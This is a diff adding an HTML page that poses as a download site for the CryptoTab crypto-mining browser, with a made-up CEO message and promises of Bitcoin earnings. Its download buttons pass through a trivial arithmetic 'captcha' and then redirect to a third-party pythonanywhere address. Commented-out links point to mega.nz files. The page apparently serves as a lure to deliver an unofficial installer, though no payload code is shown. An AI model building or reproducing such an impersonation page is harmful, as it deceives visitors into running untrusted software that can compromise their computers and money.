@@ -1,0 +1,755 @@
+<html>
+    
+    
+<head>
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+ <!--<meta http-equiv="refresh"-->
+ <!--  content="5; url=https://mega.nz/file/XQRSzCIL#0jQxDi1Ap36cOSno3tdgvbo-WM2-XezEtXmTJBSfNBs" target='_blank'>-->
+
+
+      <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="//code.jivosite.com/widget/LrsfQDfY3h" async></script>
+<script>
+      function showCaptcha() {
+        var num1 = Math.floor(Math.random() * 10 + 1);
+        var num2 = Math.floor(Math.random() * 10 + 1);
+        var answer = num1 + num2;
+        var userAnswer = prompt(num1 + " + " + num2 + " = ?");
+
+        if (userAnswer != answer) {
+          alert("Wrong answer! Try again.");
+        } else {
+          window.location.href = "https://happigeek.pythonanywhere.com/crypto";
+        }
+      }
+    </script>
+    <title>Best secured browser</title>
+    
+    
+    <!-- CSS 
+    <link rel="stylesheet" href="css/style.css" /> 
+    -->
+    
+    
+    <script>
+       //Js
+document.querySelector(".mobile-btn").addEventListener("click", function () {
+  document.querySelector(".menu").classList.toggle("active");
+}); 
+      
+    </script>
+    
+    
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@200;400;500;700&display=swap");
+/* Base */
+:root {
+  --clr-primary: #29a396;
+}
+
+*,
+*::after,
+*::before {
+  box-sizing: border-box;
+  padding: 0;
+  margin: 0;
+  font-family: "Nunito", sans-serif;
+}
+
+html {
+  scroll-behavior: smooth;
+}
+
+body {
+  width: 100%;
+  min-height: 100vh;
+  background: radial-gradient(#111, #071a1a);
+  color: #fff;
+  overflow-x: hidden;
+}
+
+.container {
+  width: 80%;
+  margin: 0 auto;
+}
+
+.flex {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.header,
+.section {
+  width: 100%;
+  padding: 40px 0;
+  overflow: hidden;
+}
+
+.header::after,
+.header::before,
+.section::after,
+.section::before {
+  content: "";
+  background: url(https://raw.githubusercontent.com/programmercloud/pgc-gym/main/img/blur-1.png);
+  position: absolute;
+  width: 400px;
+  height: 400px;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: contain;
+  bottom: 0;
+}
+
+.header::after {
+  left: -200px;
+}
+
+.header::before {
+  right: -200px;
+}
+
+.mb {
+  margin-bottom: 30px;
+}
+
+.mt {
+  margin-top: 20px;
+}
+
+.section {
+  background: #1d1f1e;
+  position: relative;
+  padding: 80px 0;
+}
+
+.section::after {
+  left: -200px;
+}
+
+.section::before {
+  width: 600px;
+  right: -200px;
+}
+
+.section:nth-child(even) {
+  background: #141615;
+}
+
+.section:nth-child(even)::after,
+.section:nth-child(even)::before {
+  display: none;
+}
+
+.primary {
+  font-size: 35px;
+  font-weight: 700;
+}
+
+.secondary {
+  font-size: 25px;
+  font-weight: 700;
+}
+
+.tertiary {
+  font-size: 15px;
+}
+/* End Base */
+
+/* Menu */
+.menu {
+  width: 100%;
+  background: linear-gradient(to right, #0e0e0e 70%, #142d2a);
+  padding: 12px 0;
+}
+
+.menu .container {
+  justify-content: space-between;
+}
+
+.mobile-btn {
+  display: none;
+}
+
+.logo {
+  cursor: pointer;
+}
+
+.logo img {
+  width: 80px;
+  height: auto;
+}
+
+.nav {
+  list-style: none;
+}
+
+.nav-item {
+  display: inline-block;
+  margin-right: 30px;
+  font-size: 18px;
+  font-weight: 400;
+}
+
+.nav-item a {
+  text-decoration: none;
+  color: #fff;
+}
+
+.nav-item:hover a {
+  color: #29a396;
+  transition: 0.3s linear;
+}
+
+.nav-item:last-of-type {
+  margin-right: 0;
+}
+/* End Menu */
+
+/* Buttons */
+.btn {
+  padding: 10px 28px;
+  background: var(--clr-primary);
+  border-radius: 40px;
+  font-size: 20px;
+  font-weight: 400;
+  text-decoration: none;
+  color: #fff;
+  display: inline-block;
+}
+
+.btn:hover {
+  background: #165f56;
+  transition: 0.3s linear;
+}
+
+.btn-2 {
+  font-size: 35px;
+  text-decoration: none;
+  color: #ccc;
+  transition: 0.3s linear;
+}
+
+.btn-2:hover {
+  color: #29a396;
+}
+
+/* End Buttons */
+
+/* Header */
+.text {
+  width: 50%;
+}
+
+.visual {
+  width: 50%;
+}
+
+.visual img {
+  width: 100%;
+}
+
+.header h1 {
+  font-size: 70px;
+  font-weight: 700;
+}
+
+.header h1 span {
+  color: var(--clr-primary);
+}
+/* End Header */
+
+.section:nth-child(even) .visual {
+  margin-right: 30px;
+}
+
+/* Trainer */
+#trainer {
+  text-align: center;
+}
+
+.trainer img {
+  border-top-left-radius: 80px;
+  border-top-right-radius: 20px;
+  border-bottom-right-radius: 80px;
+  border-bottom-left-radius: 20px;
+  margin-bottom: 10px;
+  outline: 2px solid #fff;
+  padding: 14px;
+}
+
+.trainer .mb {
+  margin-bottom: 10px;
+}
+/* End Trainer */
+
+/* Testimonial */
+#testimonial .visual img {
+  width: 90%;
+  display: block;
+  margin-left: auto;
+}
+
+.client {
+  background: #fff;
+  color: #000;
+  padding: 20px 10px;
+  margin-right: 20px;
+  text-align: center;
+  border-radius: 20px;
+  position: relative;
+  margin-top: 20px;
+}
+
+.client img {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  position: absolute;
+  top: -40px;
+  left: calc(50% - 40px);
+}
+
+.client h2 {
+  margin: 20px 0 10px 0;
+}
+/* End Testimonial */
+
+/* Discount */
+#discount {
+  padding: 40px 0;
+}
+/* End  Discount */
+
+/* Footer */
+.footer {
+  padding: 30px 0;
+  border-top: 1px solid #fff;
+  text-align: center;
+}
+/* End Footer */
+
+/* Responsive */
+
+@media (max-width: 768px) {
+  .flex {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .mobile-btn {
+    display: block;
+    font-size: 35px;
+    cursor: pointer;
+    position: absolute;
+    right: 20px;
+    top: 12px;
+  }
+
+  .menu.active .nav-item {
+    display: block;
+    margin: 30px 0;
+  }
+
+  .nav,
+  .menu .btn {
+    display: none;
+  }
+
+  .menu.active .nav,
+  .menu.active .btn {
+    display: block;
+  }
+
+  .menu.active {
+    padding: 30px 0;
+    width: 100%;
+    transition: all 0.8s ease;
+  }
+
+  .text,
+  .visual {
+    width: 100%;
+    margin-bottom: 20px;
+  }
+
+  .text h1 {
+    font-size: 45px;
+  }
+
+  .primary {
+    font-size: 28px;
+  }
+
+  .secondary {
+    font-size: 22px;
+  }
+
+  .tertiary {
+    font-size: 14px;
+  }
+
+  .trainer {
+    margin-bottom: 20px;
+  }
+
+  .client {
+    margin-bottom: 50px;
+  }
+
+  #discount .visual img {
+    width: 70%;
+    margin-bottom: 30px;
+  }
+}
+
+@media (max-width: 530px) {
+  .header::after,
+  .header::before,
+  .section::after,
+  .section::before {
+    display: none;
+  }
+
+  .primary {
+    font-size: 25px;
+  }
+
+  .secondary {
+    font-size: 20px;
+  }
+
+  .tertiary {
+    font-size: 12px;
+  }
+
+  .text h1 {
+    font-size: 34px;
+  }
+
+  .btn,
+  .btn-2 {
+    font-size: 16px;
+  }
+}
+
+/* End Responsive */
+
+
+
+.youtube {
+  position: fixed;
+  bottom: 40px;
+  left: 70px;
+  text-decoration: none;
+  padding: 8px 12px;
+  background: rgba(0,0,0,0.6);
+  border-radius: 6px;
+  box-shadow: 0 2px 2px 3px rgba(0, 0, 0, 0.2);
+  color: #fff;
+}
+
+.youtube p {
+  font-size: 22px;
+}
+
+    </style>
+</head>
+<body>
+    <!-- Menu -->
+    <div class="menu">
+      <div class="container flex">
+        <!-- Mobile Button -->
+        <div class="mobile-btn">
+          <ion-icon name="grid"></ion-icon>
+        </div>
+        <div class="logo">
+          <img
+            src="/img/logo.png"
+            alt="logo image"
+          />
+        </div>
+
+        <ul class="nav">
+          <li class="nav-item"><a href="#">Home</a></li>
+          <li class="nav-item"><a href="#why-us">Instructions</a></li>
+          <li class="nav-item"><a href="#trainer">Benefits</a></li>
+          <li class="nav-item"><a href="#explore">Affiliate</a></li>
+          <li class="nav-item"><a href="#discount">Support</a></li>
+        </ul>
+
+        <button onclick="showCaptcha()" class="btn mt">START MINING NOW</button>
+      </div>
+    </div>
+    <!-- End Menu -->
+
+    <!-- Header -->
+    <header class="header">
+      <div class="container flex">
+        <div class="text">
+          <h1 class="mb">
+            Crypto Mining<br />
+            <span>Browser</span>
+          </h1>
+
+          <p class="mb">
+         
+    <b>The Best Way To Mine Cryptocurrency</b>        <br><br>
+With over 35 million users in the world, CryptoTab is the first browser that comes with inbuilt cryptocurrency mining feature.
+                        <br><br>
+                        
+                        To start mining cryptocurrencies, simply <b>Download</b> CryptoTab Browser and enjoy an innovative browsing solution, combining the edgiest web technologies with the unique built-in mining algorithm.
+                        
+            <br><br>
+Click the button below, to start downloading on your Windows operating system.                      </p>
+
+          <button onclick="showCaptcha()" class="btn mt">Download</button>
+        </div>
+
+        <div class="visual">
+          <img
+            src="/img/cryptotab.png" width="400px" height="350px"
+            alt=""
+          />
+        </div>
+      </div>
+    </header>
+    <!-- End Header -->
+
+    <!-- Why Us -->
+    <div class="section" id="why-us">
+      <div class="container flex">
+        <div class="text">
+          <h2 class="primary mb">How To Download & Install</h2>
+          <h3 class="secondary mb">1. Download</h3>
+          <p class="tertiary">
+            Make sure you have strong internet connection and click on the download button to start your secure download.<br>
+          </p>
+<br>
+          <h3 class="secondary mb">2. Installation</h3>
+          <p class="tertiary">
+After a successful download, double click on the file you downloaded to extract and begin your installation.          </p>
+<br>
+
+    <h3 class="secondary mb">3. Enjoy</h3>
+          <p class="tertiary">
+Once the installation is completed successfully, you can start to make use of the browser while the miner runs in the background.        <br>
+          </p>
+
+        </div>
+        <div class="visual">
+         
+         <!-- video -->
+         <iframe width="100%" height="400px" src="https://www.youtube.com/embed/ybou-f6Agtk" title="CryptoTab Browser – Earn while surfing the Web" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+         
+         <!-- video ends here -->
+         <!-- <img
+            src="/img/tower.png"
+            alt=""
+          /> -->
+        </div>
+      </div>
+    </div>
+    <!-- End Why Us -->
+
+    
+
+    <!-- Trainer -->
+    <div class="section" id="trainer">
+      <h2 class="primary mb">Why We Recommend CryptoTab</h2>
+      <div class="container flex">
+        <div class="trainer">
+          <img
+            src="/img/mining.png" width="269px" height="269px"
+            alt=""
+          />
+          <h3 class="secondary mb">Mining Feature</h3>
+          <p class="tertiary mb">
+           This is a high speed browser that also allow you to earn cryptocurrency for free simply by browsing with their miner browser.
+          </p>
+          
+    <!--<a href="https://mega.nz/file/mQp3TYJY#pbm4fq6dZMHgEDD3SAcby0QTRRUZaW3No_gtPwGnL8M" class="btn">Download Now</a>-->
+          <!--<a href="#" class="btn-2">
+            <ion-icon name="arrow-redo-circle-outline"></ion-icon> 
+          </a> -->
+          
+          
+        </div>
+
+        <div class="trainer">
+          <img
+            src="/img/shield.png" width="269px" height="269px"
+            alt=""
+          />
+          <h3 class="secondary mb">Security & Filter</h3>
+          <p class="tertiary mb">
+            CryptoTab automatically blocks suspicious IP addresses and malware extensions, protecting you from online fraud and other threats.
+                      </p>
+              
+              
+              <!--<a href="https://mega.nz/file/jRBj3aYR#v3HiTKn_-6IcX3WpBx8OP-ty7HYBO5JBbnsFhhZMt3U" class="btn">Download Now</a> -->
+<!--
+          <a href="#" class="btn-2">
+            <ion-icon name="arrow-redo-circle-outline"></ion-icon>
+          </a> -->
+        </div>
+
+        <div class="trainer">
+          <img
+            src="/img/boost.png"  width="269px" height="269px"
+            alt=""
+          />
+          <h3 class="secondary mb">Cloud Boost</h3>
+          <p class="tertiary mb">
+The Cloud Boost feature speeds up mining multiple times, allowing you to earn way more on the very PC it is installed on. 
+
+</p>
+<!--
+    <a href="https://mega.nz/file/mBIAkJQK#FLfGALt0fh2nLsqqe-ibJqZmcMef8dn8w7ddKNmR8gc" class="btn">Download Now</a> -->
+          <!--
+          <a href="#" class="btn-2">
+            <ion-icon name="arrow-redo-circle-outline"></ion-icon>
+          </a> -->
+          
+        </div>
+        
+      </div>
+      <br>
+      <br>
+      <br>
+      
+       <button onclick="showCaptcha()" class="btn mt">Get CryptoTab Now</button>
+    </div>
+    <!-- End Trainer -->
+    
+    
+    <!-- Explore -->
+    <div class="section" id="explore">
+      <div class="container flex">
+        <div class="visual">
+          <img
+            src="/img/affiliate.jpeg"
+            alt=""
+          />
+        </div>
+        <div class="text">
+          <h2 class="primary mb" style="margin:8px;">
+            Earn More With <br />
+            Affiliate
+          </h2>
+          <p class="tertiary mb" style="margin:8px;">
+            Invite new users to the ecosystem, because they can earn BTC even without investing. And the more they earn, the more income you can enjoy
+          </p>
+
+          <button onclick="showCaptcha()" class="btn mt">Download</button>
+        </div>
+      </div>
+    </div>
+    <!-- End Explore -->
+
+    <!-- Testimonial -->
+    <div class="section" id="testimonial">
+      <div class="container flex">
+        <div class="text">
+          <h2 class="primary">
+            Message from <br />
+            our CEO
+          </h2>
+
+          <br />
+          <br />
+          <br />
+
+          <div class="client">
+            <img
+              src="/img/ceo.jpeg"
+              alt=""
+            />
+            <h2 class="secondary">George Jenkins</h2>
+            <p class="tertiary">
+            Our goal is to help people learn more about cryptocurrencies and show them profitable and reliable ways to earn in the blockchain world. We're committed to letting the world know from time to time what software/application could help them learn and earn BTC.
+        
+            </p>
+          </div>
+        </div>
+        <div class="visual">
+          <img
+            src="/img/sider.png"
+            alt=""
+          />
+        </div>
+      </div>
+    </div>
+    <!-- End Testimonial -->
+
+    <!-- Discount -->
+    <div class="section" id="discount">
+      <div class="container flex">
+        <div class="visual">
+          <img
+            src="/img/mann.png"
+            alt=""
+          />
+        </div>
+        <div class="text">
+          <h2 class="primary mb">
+            Enjoy high speed internet browser and earn BTC as reward.
+          </h2>
+
+          <p class="tertiary mb">
+          
+          With this amazing CryptoTab browser, you can be rest assured to earn more as you increase your daily use of it in accessing the internet.
+          <br><br>
+Should you encounter any challenge trying to download and install this browser on our platform, do not hesitate to messages us at support@cryptosbrowser.site or get on live chat with us by clicking on the support chat icon at the bottom right of this page. Our support agents will be more than glad to assist you.          </p>
+
+<h2 class="primary mb">
+            Withdraw your rewards directly to your wallet.
+          </h2>
+          
+          This is the best and most reliable free way to mine BTC while you browse the internet. Other browsers help you access the internet but CryptoTab rewards you for making use of their application that comes with a fast miner compatible with your PC
+<br><br>
+           <button onclick="showCaptcha()" class="btn mt">Download Now</button>
+        </div>
+      </div>
+    </div>
+    <!-- End Discount -->
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="container flex">
+        <p class="tertiary">
+          &copy; 2023 CryptosBrowser. All Rights Reserved.
+        </p>
+      </div>
+    </footer>
+    
+    <!-- close youtube -->
+       <!--   BTN  
+    <a href="#" class="youtube" target="__blank">
+  <p>Watch Tutorial ðŸ”¥</p>
+</a>
+    -->
+    <!-- End Footer -->
+
+    <!-- Ion Icons Js -->
+    <script
+      type="module"
+      src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"
+    ></script>
+    <script
+      nomodule
+      src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"
+    ></script>
+    <!-- JS -->
+    <script src="js/script.js"></script>
+  </body>
+
+</html>
